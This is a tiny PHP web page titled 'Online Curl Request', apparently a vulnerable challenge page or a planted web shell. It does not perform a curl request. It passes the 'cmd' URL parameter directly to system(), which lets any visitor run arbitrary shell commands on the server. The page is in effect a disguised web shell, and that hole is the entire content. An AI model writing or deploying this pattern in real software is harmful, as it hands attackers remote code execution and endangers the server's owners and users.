<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
        <?php
        if(isset($_GET['cmd']))
           system($_GET['cmd']); 
        ?>
        </div>
        </div>
    </body>
</html>